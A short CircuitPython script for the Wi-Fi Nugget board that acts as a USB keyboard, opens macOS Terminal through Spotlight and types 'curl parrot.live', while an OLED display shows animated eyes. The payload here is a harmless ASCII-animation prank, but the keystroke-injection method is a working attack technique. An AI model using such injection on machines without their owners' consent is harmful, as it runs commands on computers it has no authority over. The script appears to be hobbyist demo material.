## Wi-Fi Nugget HID Attack Example, With OLED indicator

import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from digitalio import DigitalInOut, Direction, Pull
from board import SCL, SDA
import busio
import displayio
import adafruit_framebuf
import adafruit_displayio_sh1106
import time

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

displayio.release_displays()
WIDTH = 130 # Change these to the right size for your display!
HEIGHT = 64
BORDER = 1
i2c = busio.I2C(SCL, SDA) # Create the I2C interface.
display_bus = displayio.I2CDisplay(i2c, device_address=0x3c)
display = adafruit_displayio_sh1106.SH1106(display_bus, width=WIDTH, height=HEIGHT) # Create the SH1106 OLED class.

NugImages= ["/faces/j1.bmp", "/faces/j2.bmp", "/faces/j3.bmp", "/faces/j4.bmp", "/faces/j5.bmp", "/faces/j6.bmp", "/faces/j7.bmp"]

def NugEyes(IMAGE): ## Make a function to put eyes on the screen
    bitmap = displayio.OnDiskBitmap(IMAGE) # Setup the file as the bitmap data source
    tile_grid = displayio.TileGrid(bitmap, pixel_shader=bitmap.pixel_shader) # Create a TileGrid to hold the bitmap
    group = displayio.Group() # Create a Group to hold the TileGrid
    group.append(tile_grid) # Add the TileGrid to the Group
    display.show(group) # Add the Group to the Display
NugEyes("/faces/uwu.bmp")

def NuggetAnimate():
    for nugs in NugImages:
        NugEyes(nugs)

def MacOSPayload():
    kbd.send(Keycode.GUI, Keycode.SPACE), time.sleep(.5)
    layout.write('terminal.app\n'), time.sleep(1)
    layout.write('curl parrot.live\n')

MacOSPayload()
while True:
    NuggetAnimate()
